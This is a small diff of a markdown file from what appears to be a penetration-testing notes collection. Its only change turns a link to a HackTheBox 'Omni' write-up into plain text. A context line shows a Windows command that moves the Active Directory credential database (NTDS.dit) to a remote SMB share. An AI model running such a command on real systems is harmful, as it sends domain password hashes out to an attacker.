@@ -44,7 +44,7 @@ cmd.exe /c move C:\NTDS\NTDS.dit \\$ip\CompData
 ```
 
 
-Sidenote: see [the HackTheBox machine Omni](htb-omni.md), which uses [SirepRAT](sireprat.md) to upload files to the share. A taste of it:
+Sidenote: see the "HackTheBox machine Omni", which uses [SirepRAT](sireprat.md) to upload files to the share. A taste of it:
 
 ```bash
 # First crate the shared. After that, establish the connection:
